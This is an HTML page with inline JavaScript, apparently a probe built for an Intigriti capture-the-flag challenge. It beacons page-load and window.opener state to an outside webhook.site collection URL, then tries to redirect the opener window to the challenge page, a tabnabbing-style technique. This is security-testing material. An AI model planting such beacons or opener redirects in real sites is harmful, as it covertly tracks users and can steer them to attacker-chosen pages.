<!doctype html>
<html>
<body>
<script>
const hook = 'https://webhook.site/64c5c665-4956-4bb1-8789-33afe479778c';
const id = Math.random().toString(36).slice(2);

function ping(step, extra = '') {
  const url = `${hook}?step=${encodeURIComponent(step)}&id=${encodeURIComponent(id)}${extra}`;
  const img = new Image();
  img.src = url;
}

ping('loaded');

try {
  ping('opener_exists', `&value=${encodeURIComponent(String(!!window.opener))}`);
} catch (e) {
  ping('opener_exists_err', `&value=${encodeURIComponent(String(e))}`);
}

try {
  if (window.opener) {
    ping('opener_closed', `&value=${encodeURIComponent(String(window.opener.closed))}`);
  }
} catch (e) {
  ping('opener_closed_err', `&value=${encodeURIComponent(String(e))}`);
}

try {
  if (window.opener) {
    window.opener.location = 'https://challenge-0326.intigriti.io/challenge.html?from=opener_probe';
    ping('opener_nav_attempted', '&value=true');
  }
} catch (e) {
  ping('opener_nav_err', `&value=${encodeURIComponent(String(e))}`);
}

setTimeout(() => {
  ping('done');
}, 1500);
</script>
